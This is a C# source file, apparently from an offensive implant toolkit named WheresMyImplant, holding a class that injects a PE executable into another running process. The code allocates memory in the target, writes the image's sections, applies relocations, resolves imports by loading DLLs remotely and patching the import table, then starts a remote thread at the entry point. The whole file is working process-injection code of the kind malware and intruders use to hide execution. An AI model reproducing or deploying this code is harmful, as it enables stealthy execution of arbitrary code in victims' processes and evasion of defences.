using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

using System.IO;

namespace WheresMyImplant
{
    class InjectPERemote : BaseRemote
    {
        private const UInt32 PROCESS_CREATE_THREAD = 0x0002;
        private const UInt32 PROCESS_QUERY_INFORMATION = 0x0400;
        private const UInt32 PROCESS_VM_OPERATION = 0x0008;
        private const UInt32 PROCESS_VM_WRITE = 0x0020;
        private const UInt32 PROCESS_VM_READ = 0x0010;

        private const UInt32 MEM_COMMIT = 0x00001000;
        private const UInt32 MEM_RESERVE = 0x00002000;

        private const UInt32 PAGE_READWRITE = 0x04;
        private const UInt32 PAGE_EXECUTE_READ = 0x20;
        private const UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        public PELoader peLoader;
        public string parameters;

        public InjectPERemote(UInt32 processId, PELoader peLoaderNew, string parametersNew) : base(processId)
        {
            peLoader = peLoaderNew;
            parameters = parametersNew;
        }

        public void execute()
        {
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpBaseAddress = VirtualAllocExChecked(new IntPtr(0), peLoader.sizeOfImage);
            WriteOutputNeutral("Iterating through " + peLoader.imageFileHeader.NumberOfSections + " Headers");
            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < peLoader.imageFileHeader.NumberOfSections; i++)
            {
                IntPtr lpBaseAddressSection = new IntPtr(lpBaseAddress.ToInt64() + peLoader.imageSectionHeaders[i].VirtualAddress);
                GCHandle pinnedArray = GCHandle.Alloc(peLoader.imageBytes, GCHandleType.Pinned);
                IntPtr imageBytesPtr = new IntPtr((Int64)pinnedArray.AddrOfPinnedObject() + peLoader.imageSectionHeaders[i].PointerToRawData);
                UInt32 dwSizeSection = peLoader.imageSectionHeaders[i].SizeOfRawData;
                string sectionName = new string(peLoader.imageSectionHeaders[i].Name);
                WriteProcessMemoryChecked(lpBaseAddressSection, imageBytesPtr, dwSizeSection, sectionName);
           }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpRelocationTable = new IntPtr(lpBaseAddress.ToInt64() + peLoader.baseRelocationTableAddress);
            Structs.IMAGE_BASE_RELOCATION relocationEntry = PtrToStructureRemote<Structs.IMAGE_BASE_RELOCATION>(lpRelocationTable);
            UInt32 imageSizeOfBaseRelocation = (UInt32)Marshal.SizeOf(typeof(Structs.IMAGE_BASE_RELOCATION));
            Int32 sizeofNextBlock = (Int32)relocationEntry.SizeOfBlock;
            IntPtr offset = lpRelocationTable;
            
            ////////////////////////////////////////////////////////////////////////////////
            while (true)
            {
                IntPtr lpNextRelocationEntry = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeofNextBlock);
                Structs.IMAGE_BASE_RELOCATION relocationNextEntry = PtrToStructureRemote<Structs.IMAGE_BASE_RELOCATION>(lpNextRelocationEntry);
                IntPtr destinationAddress = new IntPtr(lpBaseAddress.ToInt64() + (Int32)relocationEntry.VirtualAdress);
                Int32 entries = (Int32)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
                
                ////////////////////////////////////////////////////////////////////////////////
                // Some magic from subtee
                ////////////////////////////////////////////////////////////////////////////////
                for (Int32 i = 0; i < entries; i++)
                {
                    UInt16 value = (UInt16)ReadInt16Remote(offset, 8 + (2 * i));
                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);
                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0xA:
                            IntPtr lpPatchAddress = new IntPtr(destinationAddress.ToInt64() + (Int32)fixup);
                            Int64 originalAddress = ReadInt64Remote(lpPatchAddress);
                            Int64 delta64 = (Int64)(lpBaseAddress.ToInt64() - (Int64)peLoader.imageOptionalHeader64.ImageBase);
                            IntPtr lpOriginalAddress = new IntPtr(originalAddress + delta64);
                            WriteInt64Remote(lpPatchAddress, originalAddress + delta64);
                            break;
                    }
                }
                offset = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeofNextBlock);
                sizeofNextBlock += (Int32)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;
                //"The last entry is set to zero (NULL) to indicate the end of the table." - cool
                if (0 == relocationNextEntry.SizeOfBlock)
                {
                    break;
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            //http://sandsprite.com/CodeStuff/Understanding_imports.html
            ////////////////////////////////////////////////////////////////////////////////
            Int32 sizeOfStruct = Marshal.SizeOf(typeof(Structs._IMAGE_IMPORT_DIRECTORY));
            Int32 multiplier = 0;
            Process localProcess = Process.GetCurrentProcess();
            IntPtr lpLocalBaseAddress = localProcess.MainModule.BaseAddress;
            Process remoteProcess = Process.GetProcessById((Int32)localProcess.Id);
            IntPtr lpRemoteBaseAddress = remoteProcess.MainModule.BaseAddress;
            
            while(true)
            {
                Int32 dwImportTableAddressOffset = ((sizeOfStruct * multiplier++) + peLoader.importTableAddress);
                IntPtr lpImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + dwImportTableAddressOffset);
                Structs._IMAGE_IMPORT_DIRECTORY imageImportDirectory = PtrToStructureRemote<Structs._IMAGE_IMPORT_DIRECTORY>(lpImportAddressTable);
                if (0 == imageImportDirectory.RvaImportAddressTable) 
                { 
                    break; 
                }

				////////////////////////////////////////////////////////////////////////////////
				IntPtr dllNamePTR = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.RvaModuleName);
                string dllName = PtrToStringAnsiRemote(dllNamePTR).Replace("\0", "");
                IntPtr lpLocalModuleAddress = Unmanaged.LoadLibrary(dllName);
                IntPtr lpModuleBaseAddress = LoadLibraryRemote(dllName);
                WaitForSingleObjectExRemote(lpModuleBaseAddress);
                WriteOutputGood("Loaded " + dllName);
				
				////////////////////////////////////////////////////////////////////////////////
                IntPtr lpRvaImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.RvaImportAddressTable);
                
                while (true)
                {
                    Int32 dwRvaImportAddressTable = PtrToInt32Remote(lpRvaImportAddressTable);
                    if (0 == dwRvaImportAddressTable)
                    {
                        break;
                    }
                    else
                    {
                        IntPtr lpDllFunctionName = (new IntPtr(lpBaseAddress.ToInt64() + dwRvaImportAddressTable + 2));
                        string dllFunctionName = PtrToStringAnsiRemote(lpDllFunctionName).Replace("\0", "");
                        IntPtr hModule = Unmanaged.GetModuleHandle(dllName);
                        IntPtr lpLocalFunctionAddress = Unmanaged.GetProcAddress(hModule, dllFunctionName);
                        IntPtr lpRelativeFunctionAddress = new IntPtr(lpLocalFunctionAddress.ToInt64() - lpLocalBaseAddress.ToInt64());
                        IntPtr lpFunctionAddress = new IntPtr(lpRemoteBaseAddress.ToInt64() + lpRelativeFunctionAddress.ToInt64());
                        WriteOutputGood("\tLoaded Function " + dllFunctionName);
                        //baseRemote.WriteProcessMemoryUnChecked(lpRvaImportAddressTable, lpFunctionAddress, sizeof(Int64),"");

                        WriteInt64Remote(lpRvaImportAddressTable, (Int64)lpFunctionAddress);
                        lpRvaImportAddressTable = new IntPtr(lpRvaImportAddressTable.ToInt64() + sizeof(Int64));
                    }
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            Int64 dwStartAddress = lpBaseAddress.ToInt64() + peLoader.addressOfEntryPoint;
            IntPtr lpStartAddress = new IntPtr(dwStartAddress);
            IntPtr lpParameter = IntPtr.Zero;
            CreateRemoteThreadChecked(lpStartAddress, lpParameter);
        }
    }
}
